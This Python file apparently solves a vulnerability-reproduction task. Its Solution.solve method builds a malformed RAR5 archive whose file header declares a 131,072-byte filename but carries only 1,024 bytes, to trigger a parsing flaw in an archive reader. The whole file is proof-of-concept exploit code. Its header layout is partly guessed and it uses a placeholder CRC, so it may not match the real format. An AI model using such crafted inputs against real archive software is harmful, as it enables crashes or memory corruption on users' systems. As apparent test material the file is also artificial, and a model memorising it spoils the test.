import struct
import os
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature
        signature = b'Rar!\x1a\x07\x01\x00'
        
        # Build a RAR5 archive with an oversized filename
        # RAR5 header structure:
        # - CRC32 (4 bytes)
        # - Header size (varint)
        # - Header type (varint)
        # - Header flags (varint)
        # - Additional fields based on type
        
        # We'll create a file header (type 2) with an oversized filename
        
        # Calculate header without CRC for CRC computation
        header_type = 2  # File header
        header_flags = 0x0800  # Has filename
        
        # Encode varints
        def encode_varint(value):
            result = bytearray()
            while True:
                byte = value & 0x7F
                value >>= 7
                if value == 0:
                    result.append(byte)
                    break
                else:
                    result.append(byte | 0x80)
            return bytes(result)
        
        # Create filename with size that triggers vulnerability
        # We need a filename size > maximum allowed (likely 0x10000 or 65536)
        # Let's use 0x20000 (131072) which is well above typical limits
        filename_size = 0x20000  # 131072 bytes
        filename = b'A' * min(1024, filename_size)  # We don't need full filename in archive
        
        # Build header without CRC
        header_parts = bytearray()
        header_parts.extend(encode_varint(29 + len(encode_varint(filename_size)) + len(filename)))  # Header size
        header_parts.extend(encode_varint(header_type))  # Header type
        header_parts.extend(encode_varint(header_flags))  # Header flags
        
        # File attributes (optional, add minimal)
        header_parts.extend(b'\x00\x00\x00\x00')  # 4 zero bytes
        
        # Modification time (optional)
        header_parts.extend(b'\x00\x00\x00\x00')
        
        # Uncompressed size (0 for empty file)
        header_parts.extend(encode_varint(0))
        
        # Filename size (oversized) and filename
        header_parts.extend(encode_varint(filename_size))
        header_parts.extend(filename)
        
        # Calculate CRC32 of header (excluding the CRC field itself)
        crc = zlib.crc32(header_parts) & 0xFFFFFFFF
        
        # Build final header with CRC
        header = bytearray()
        header.extend(struct.pack('<I', crc))
        header.extend(header_parts)
        
        # Build archive: signature + header + end of archive header
        archive = bytearray()
        archive.extend(signature)
        archive.extend(header)
        
        # Add end of archive header (type 5)
        end_header = bytearray()
        end_header.extend(struct.pack('<I', 0))  # CRC32 of 0 for simplicity
        end_header.extend(encode_varint(7))  # Header size
        end_header.extend(encode_varint(5))  # Header type (end of archive)
        end_header.extend(encode_varint(0))  # No flags
        
        archive.extend(end_header)
        
        return bytes(archive)
